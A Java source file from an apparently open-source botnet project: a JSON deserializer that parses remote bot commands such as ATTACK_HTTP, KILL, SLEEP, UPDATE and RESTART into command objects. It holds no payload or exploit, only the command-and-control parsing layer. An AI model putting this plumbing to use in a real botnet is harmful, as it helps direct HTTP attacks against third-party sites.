/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.control.command.serial;

import com.acmutv.botnet.core.attack.HttpAttack;
import com.acmutv.botnet.core.control.command.BotCommand;
import com.acmutv.botnet.core.control.command.CommandScope;
import com.acmutv.botnet.tool.time.Interval;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.deser.std.StdDeserializer;

import java.io.IOException;
import java.util.*;

/**
 * This class realizes the JSON deserializer for {@link BotCommand}.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
public class BotCommandDeserializer extends StdDeserializer<BotCommand> {

  /**
   * The singleton of {@link BotCommandDeserializer}.
   */
  private static BotCommandDeserializer instance;

  /**
   * Returns the singleton of {@link BotCommandDeserializer}.
   * @return the singleton.
   */
  public static BotCommandDeserializer getInstance() {
    if (instance == null) {
      instance = new BotCommandDeserializer();
    }
    return instance;
  }

  /**
   * Initializes the singleton of {@link BotCommandDeserializer}.
   */
  private BotCommandDeserializer() {
    super((Class<BotCommand>) null);
  }

  @Override
  public BotCommand deserialize(JsonParser parser, DeserializationContext ctx) throws IOException {
    JsonNode node = parser.getCodec().readTree(parser);

    if (!node.has("command")) {
      throw new IOException("Cannot read command scope (missing).");
    }

    CommandScope scope;
    try {
      scope = CommandScope.valueOf(node.get("command").asText());
    } catch (IllegalArgumentException exc) {
      throw new IOException("Cannot read command scope (malformed).");
    }

    BotCommand cmd = new BotCommand(scope);

    if (cmd.getScope().isWithParams()) {

      switch (cmd.getScope()) {

        case ATTACK_HTTP:
          if (node.hasNonNull("attacks")) {
            List<HttpAttack> httpAttacks = new ArrayList<>();
            Iterator<JsonNode> i = node.get("attacks").elements();
            while (i.hasNext()) {
              JsonNode n = i.next();
              HttpAttack attack = ctx.readValue(n.traverse(parser.getCodec()), HttpAttack.class);
              httpAttacks.add(attack);
            }

            cmd.getParams().put("attacks", httpAttacks);
          } else {
            throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_HTTP] (missing)");
          }

          if (node.hasNonNull("delay")) {
            final Interval attackHttpDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", attackHttpDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean attackhttpReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", attackhttpReport);
          }

          break;

        case CALMDOWN:
          if (node.hasNonNull("wait")) {
            final boolean calmdownWait = node.get("wait").asBoolean();
            cmd.getParams().put("wait", calmdownWait);
          }

          if (node.hasNonNull("delay")) {
            final Interval calmdownDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", calmdownDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean calmdownReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", calmdownReport);
          }

          break;

        case KILL:
          if (node.hasNonNull("wait")) {
            final boolean killWait = node.get("wait").asBoolean();
            cmd.getParams().put("wait", killWait);
          }

          if (node.hasNonNull("delay")) {
            final Interval killDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", killDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean killReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", killReport);
          }

          break;

        case REPORT:
          if (node.hasNonNull("delay")) {
            final Interval reportDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", reportDelay);
          }

          break;

        case RESTART:
          if (!node.has("resource")) {
            throw new IOException("Cannot read parameter [resource] for scope [RESTART] (missing)");
          }
          final String resource = node.get("resource").asText();

          if (node.hasNonNull("wait")) {
            final boolean restartWait = node.get("wait").asBoolean();
            cmd.getParams().put("wait", restartWait);
          }

          cmd.getParams().put("resource", resource);

          if (node.hasNonNull("delay")) {
            final Interval restartDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", restartDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean restartReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", restartReport);
          }

          break;

        case SAVE_CONFIG:
          if (node.hasNonNull("delay")) {
            final Interval saveConfigDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", saveConfigDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean saveConfigReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", saveConfigReport);
          }

          break;

        case SLEEP:
          if (node.hasNonNull("timeout")) {
            final Interval sleepTimeout = Interval.valueOf(node.get("timeout").asText());
            cmd.getParams().put("timeout", sleepTimeout);
          }

          if (node.hasNonNull("delay")) {
            final Interval sleepDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", sleepDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean sleepReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", sleepReport);
          }

          break;

        case UPDATE:
          if (node.hasNonNull("settings")) {
            final Map<String,String> settings =
                new ObjectMapper().readValue(node.get("settings").traverse(), new TypeReference<Map<String,String>>(){});
            cmd.getParams().put("settings", settings);
          } else {
            throw new IOException("Cannot read parameters [settings] for scope [UPDATE] (missing)");
          }

          if (node.hasNonNull("delay")) {
            final Interval updateDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", updateDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean updateReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", updateReport);
          }

          break;

        case WAKEUP:
          if (node.hasNonNull("delay")) {
            final Interval wakeupDelay = Interval.valueOf(node.get("delay").asText());
            cmd.getParams().put("delay", wakeupDelay);
          }

          if (node.hasNonNull("report")) {
            final Boolean wakeupReport = Boolean.valueOf(node.get("report").asBoolean());
            cmd.getParams().put("report", wakeupReport);
          }

          break;

        default:
          break;
      }
    }

    return cmd;
  }
}